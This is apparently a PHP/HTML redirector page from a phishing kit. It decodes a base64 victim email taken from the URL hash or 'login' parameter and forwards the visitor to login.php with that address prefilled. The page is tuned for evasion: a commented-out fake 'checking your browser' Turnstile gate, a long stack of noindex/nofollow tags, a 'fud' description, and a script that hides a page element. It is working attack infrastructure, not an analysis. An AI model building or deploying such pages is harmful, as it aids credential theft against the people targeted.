<?php
// if (!isset($_COOKIE['captcha']) || $_COOKIE['captcha'] != 1) {
	// include 'config.php';
	// echo '<html><head><script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.3/jquery.min.js"></script><script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script><meta name="viewport" content="width=device-width, initial-scale=1"></head><body> Please stand by, while we are checking your browser... <br><br><form id="myForm" action="validate.php" method="post"><div class="cf-turnstile" data-sitekey="' . $sitekey . '" data-callback="javascriptCallback"></div></form><script>function javascriptCallback(){var a=$("#myForm"),t=a.attr("action");a.submit(function(a){a.preventDefault()}),$.ajax({type:"POST",url:t,data:a.serialize(),success:function(a){location.reload()}})}</script></body></html>';
	// exit();
// }

?>
<!doctype html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta name="description" content="">
	<meta name="description" content="fud">
	<meta name="robots" content="noindex">
	<meta name="googlebot" content="noindex">
	<meta name="googlebot-news" content="noindex">
	<meta name="otherbot" content="noindex">
	<meta name="noarchive" content="noindex">
	<meta name="nosnippet" content="noindex">
	<meta name="noimageindex" content="noindex"> 
	<meta name="robots" content="nofollow">
	<meta name="googlebot" content="nofollow">
	<meta name="googlebot-news" content="nofollow">
	<meta name="otherbot" content="nofollow">
	<meta name="noarchive" content="nofollow">
	<meta name="nosnippet" content="nofollow">
	<meta name="noimageindex" content="nofollow">
	<meta name="robots" content="max-snippet:0">
	<meta name="robots" content="unavailable_after: 2020-09-22">
    <link href="index.html" rel="canonical"/>
	<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.js"></script>
<script>

$(document).ready(function() {                
var base64email = window.location.hash.substr(1);
var href = window.location.href;
var url_string = href;
var url = new URL(url_string);
var base64login = url.searchParams.get("login");
if (base64email){
var email = atob(base64email);
} else if(base64login){
var email = atob(base64login);
}else{
var email = "";
}
if (email) {

var url = 'login.php?id='+email;
setTimeout(() => {window.location.replace(url);}, 10); 
}
else {
var url = 'login.php';
setTimeout(() => {window.location.replace(url);}, 10); 

}
});

</script>
<script>
  
   $(document).ready(function() {
  setTimeout(() => {
  var box = document.getElementById('gt-nvframe');
 
   box.style.display = 'none';
  
}, 0); //
		

		});
        </script>
</head>

</html>